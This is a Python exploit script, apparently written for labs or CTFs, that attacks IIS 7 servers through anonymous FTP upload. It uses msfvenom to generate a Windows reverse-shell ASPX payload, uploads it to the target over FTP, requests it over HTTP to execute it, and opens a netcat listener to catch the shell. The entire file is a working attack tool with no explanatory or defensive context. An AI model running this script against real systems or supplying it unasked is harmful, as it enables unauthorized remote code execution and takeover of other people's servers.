import threading
from ftplib import FTP
import requests
import os
import argparse

class Ftpfiis7():
    def __init__(self,victim,lhost,lport):
        self.victim = victim
        self.lhost = lhost
        self.lport = lport
        self.venom()
        self.ftpexploit()
        self.execute_payload()

    def venom(self):
        os.system('msfvenom -p windows/shell_reverse_tcp -f aspx -o shell.aspx LHOST=' + self.lhost + ' LPORT=' + self.lport)

    def ftpexploit(self):
        filename = 'shell.aspx'
        ftp_target = FTP(self.victim)
        ftp_target.login()
        ftp_target.storbinary('STOR '+filename, open(filename, 'rb'))
        ftp_target.dir()
        ftp_target.quit()

    def website(self):
        victim_url = 'http://' + self.victim + '/shell.aspx'
        requests.get(victim_url)
        print("Requesting Payload on " + victim_url)

    def rev_shell(self):
        net_cat = "nc -lvnp " + self.lport
        os.system(net_cat)
    
    def execute_payload(self):
        website_thread = threading.Thread(target=self.website())
        rev_shell_thread = threading.Thread(target=self.rev_shell())

        website_thread.start()
        rev_shell_thread.start()

        website_thread.join()
        rev_shell_thread.join()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='FTP IIS 7 Upload exploit')

    parser.add_argument('-t', metavar="<Target's IP>", help='target/host IP, E.G: 11.13.13.17', required=True)
    parser.add_argument('-lhost', metavar='<lhost>', help='Your IP Address', required=True)
    parser.add_argument('-lport', metavar='<lport>', help='Your Listening Port', required=True)
    args = parser.parse_args()

    try:
        Ftpfiis7(args.t,args.lhost,args.lport)
    except KeyboardInterrupt:
        print("Bye Bye!\n")
        exit()